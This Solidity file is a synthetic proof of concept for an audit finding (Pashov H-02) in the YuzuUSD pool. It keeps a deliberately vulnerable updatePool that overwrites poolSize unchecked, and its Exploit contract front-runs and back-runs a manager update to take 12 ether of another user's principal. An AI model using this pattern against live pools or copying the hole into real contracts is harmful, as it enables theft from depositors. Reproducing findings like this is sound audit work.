// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  YuzuUSD — updatePool writes an external poolSize with no freshness check
    (Pashov H-02, finding 62757). SYNTHETIC, cheatcode-free.
    User1 redeems half, the manager restores poolSize to the pre-redeem value,
    and User1's remaining shares pay 72 instead of 60. User1 nets +12.
    User2's 90 of principal is backed by 78. Vulnerable line preserved (@> VULN). */

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YuzuILP {
    bytes32 internal constant POOL_MANAGER_ROLE = keccak256("POOL_MANAGER_ROLE");

    MockToken public asset;
    address public manager;
    uint256 public poolSize;
    uint256 public dailyLinearYieldRatePpm;
    uint256 public lastPoolUpdateTimestamp;
    uint256 public totalShares;
    uint256 public liquid;
    uint256 public inflated;
    mapping(address => uint256) public shares;

    constructor(MockToken a, address m) {
        asset = a;
        manager = m;
    }

    modifier onlyRole() {
        require(msg.sender == manager, "role");
        _;
    }

    function deposit(uint256 assets) external {
        asset.transferFrom(msg.sender, address(this), assets);
        uint256 minted = totalShares == 0 ? assets : assets * totalShares / poolSize;
        shares[msg.sender] += minted;
        totalShares += minted;
        poolSize += assets;
        liquid += assets;
    }

    function updatePool(uint256 newPoolSize, uint256 newDailyLinearYieldRatePpm) external onlyRole {
        require(newDailyLinearYieldRatePpm <= 1e6, "yield");
        poolSize = newPoolSize; // @> VULN: poolSize is replaced without checking the post-redeem liquid balance
        // FIX: require(newPoolSize == liquid) or accept updates only while deposits and redeems are paused
        dailyLinearYieldRatePpm = newDailyLinearYieldRatePpm;
        lastPoolUpdateTimestamp = block.timestamp;
    }

    function redeem(uint256 shareAmt) external returns (uint256 assetsOut) {
        assetsOut = shareAmt * poolSize / totalShares; // S2 on the front-run, later the inflated payout
        shares[msg.sender] -= shareAmt;
        totalShares -= shareAmt;
        poolSize -= assetsOut;
        liquid -= assetsOut;
        asset.transfer(msg.sender, assetsOut);
        if (assetsOut > shareAmt) _note(assetsOut - shareAmt);
    }

    function _note(uint256 extra) internal {
        inflated += extra; // S6 only the back-run pays more assets than shares burned
    }
}

contract Manager {
    YuzuILP public ilp;

    function setIlp(YuzuILP i) external {
        ilp = i;
    }

    function push() external {
        ilp.updatePool(180 ether, 100000); // S4 manager restores the stale size
    }
}

contract Victim {
    function approve(MockToken t, address spender) external {
        t.approve(spender, type(uint256).max);
    }

    function deposit(YuzuILP ilp, uint256 amount) external {
        ilp.deposit(amount);
    }
}

contract Exploit {
    MockToken public token; // nonce 1
    Victim public victim; // nonce 2
    Manager public manager; // nonce 3
    YuzuILP public ilp; // nonce 4

    constructor() {
        token = new MockToken();
        victim = new Victim();
        manager = new Manager();
        ilp = new YuzuILP(token, address(manager));
        manager.setIlp(ilp);
        token.mint(address(this), 90 ether);
        token.mint(address(victim), 90 ether);
        token.approve(address(ilp), type(uint256).max);
        victim.approve(token, address(ilp));
    }

    function run() external {
        ilp.deposit(90 ether);
        victim.deposit(ilp, 90 ether);
        ilp.redeem(30 ether); // S1 front-run: 30 shares pay 30 at the real pool
        manager.push(); // S3
        ilp.redeem(60 ether); // S5 back-run the remaining shares at the restored poolSize
        require(token.balanceOf(address(this)) == 102 ether, "user1 extracted 12");
        require(token.balanceOf(address(ilp)) == 78 ether, "user2 principal is short 12");
        require(ilp.shares(address(victim)) == 90 ether, "user2 still holds 90 shares");
        require(ilp.inflated() == 12 ether, "12 of the payout was above shares burned");
    }
}
